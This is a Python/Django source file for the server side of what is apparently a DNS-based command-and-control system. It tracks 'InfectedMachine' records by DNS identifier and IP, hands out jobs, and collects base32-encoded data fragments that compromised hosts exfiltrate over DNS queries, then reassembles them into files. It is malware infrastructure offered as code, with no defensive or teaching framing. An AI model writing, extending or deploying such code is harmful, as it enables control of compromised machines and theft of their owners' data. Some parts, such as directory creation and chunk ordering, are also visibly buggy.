import base64
import os
from re import Match

from decouple import config
from django.utils import timezone

from djangoproject.constants.DnsMatchEnum import DnsMatchEnum
from djangoproject.models import InfectedMachine


class ExecService:

    def process(self, query_type: DnsMatchEnum, data: Match, client_ip: str):
        if query_type == DnsMatchEnum.GET_JOB:
            self.process_job_get(data.group(1), client_ip)
        elif query_type == DnsMatchEnum.RETURN_JOB_FRAGMENT:
            self.process_job_return_fragment(data.group(3), data.group(2), data.group(1))
        elif query_type == DnsMatchEnum.JOB_FINISHED:
            self.process_job_finish(data.group(1))

    def process_job_get(self, machine_id: str, ip: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()

        if machine is None:
            machine = self.create_machine(machine_id)

        machine.last_handshake_at = timezone.now()
        machine.ip = ip
        machine.save()

    def process_job_return_fragment(self, machine_id: str, data: str, chunk_id: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
        if machine is None:
            return

        job = machine.get_current_job()
        if job is None:
            return

        if job.started_at is None:
            job.started_at = timezone.now()
            job.save()

        data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
        os.makedirs("folder/path", exist_ok=True)

        with open(f"{data_folder}/chunk-{chunk_id}", "w") as f:
            f.write(data)

    def process_job_finish(self, machine_id: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
        if machine is None:
            return

        job = machine.get_current_job()
        if job is None:
            return

        job.finished_at = timezone.now()
        job.save()

        # TODO fusionner les fichiers
        data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
        chunks = [f for f in os.listdir(data_folder) if f.startswith('chunk-')]
        with open(f"{data_folder}/final-file", "w") as f:
            for chunk in chunks:
                with open(f"{data_folder}/{chunk}", "r") as c:
                    f.write(
                        base64.b32decode(c.read()).decode('UTF-8')
                    )

    def create_machine(self, machine_id: str) -> InfectedMachine:
        machine = InfectedMachine(dns_identifier=machine_id)
        machine.save()

        return machine
